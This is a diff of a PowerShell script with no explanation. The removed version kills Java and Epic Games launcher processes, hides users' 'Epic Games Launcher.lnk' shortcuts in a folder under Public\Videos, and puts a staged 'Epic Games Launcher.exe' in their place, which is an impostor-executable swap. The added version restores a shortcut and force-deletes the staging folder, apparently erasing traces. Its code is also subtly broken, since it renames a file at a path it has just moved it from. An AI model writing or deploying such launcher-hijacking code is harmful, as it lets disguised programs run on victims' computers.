@@ -1,44 +1,25 @@
-Stop-Process -Name "java", "javaw", "EpicGamesLauncher" -Force
+# Stop the "Epic Games Launcher.exe" process
+Stop-Process -Name "Epic Games Launcher" -Force -ErrorAction SilentlyContinue
 
-# Define source and destination paths
-$sourcePaths = @("C:\Users\$($env:USERNAME)", "C:\Program Files")
-$destinationPath = "C:\Users\Public\Videos\GraphicalUserInterface"
-$counter = 1
+# Search for the "Epic Games Launcher.exe" file
+$launcherFilePath = Get-ChildItem -Path "C:\Users" -Recurse -Filter "Epic Games Launcher.exe" -File | Select-Object -First 1
 
-# Function to recursively search for the file and perform the required actions
-function SearchAndMoveFile {
-    param (
-        [string]$directory
-    )
+if ($launcherFilePath) {
+    # Store the path of "Epic Games Launcher.exe"
+    $launcherPath = $launcherFilePath.DirectoryName
 
-    Write-Host "Searching in $directory"
+    # Move the §1.lnk file to the location of "Epic Games Launcher.exe"
+    $lnkFilePath = Join-Path -Path $env:PUBLIC -ChildPath "Videos\GraphicalUserInterface\§1.lnk"
+    Move-Item -Path $lnkFilePath -Destination $launcherPath -Force
 
-    # Get all files in the current directory
-    $files = Get-ChildItem -Path $directory -File -Recurse -Filter "Epic Games Launcher.lnk" -ErrorAction SilentlyContinue
+    # Rename the §1.lnk file to "Epic Games Launcher.lnk"
+    $newName = Join-Path -Path $launcherPath -ChildPath "Epic Games Launcher.lnk"
+    Rename-Item -Path $lnkFilePath -NewName $newName
 
-    # Move the found file and perform the required operations
-    foreach ($file in $files) {
-        $newFileName = "§$counter.lnk"
-        $newFilePath = Join-Path -Path $destinationPath -ChildPath $newFileName
-        Write-Host "Moving $($file.FullName) to $newFilePath"
-        Move-Item -Path $file.FullName -Destination $newFilePath -Force
-
-        # Move Epic Games Launcher.exe to the original location of Epic Games Launcher.lnk
-        $exeFilePath = Join-Path -Path $destinationPath -ChildPath "myapp\Epic Games Launcher.exe"
-        Write-Host "Moving Epic Games Launcher.exe to $($file.Directory.FullName)"
-        Move-Item -Path $exeFilePath -Destination $file.Directory.FullName -Force
-
-        $counter++
-    }
-
-    # Recursively search subdirectories
-    $subDirectories = Get-ChildItem -Path $directory -Directory -ErrorAction SilentlyContinue
-    foreach ($subDirectory in $subDirectories) {
-        SearchAndMoveFile -directory $subDirectory.FullName
-    }
+    # Remove the directory "GraphicalUserInterface"
+    $guiPath = Join-Path -Path $env:PUBLIC -ChildPath "Videos\GraphicalUserInterface"
+    Remove-Item -Path $guiPath -Recurse -Force
 }
-
-# Loop through source paths and start the search
-foreach ($path in $sourcePaths) {
-    SearchAndMoveFile -directory $path
+else {
+    Write-Host "File not found"
 }
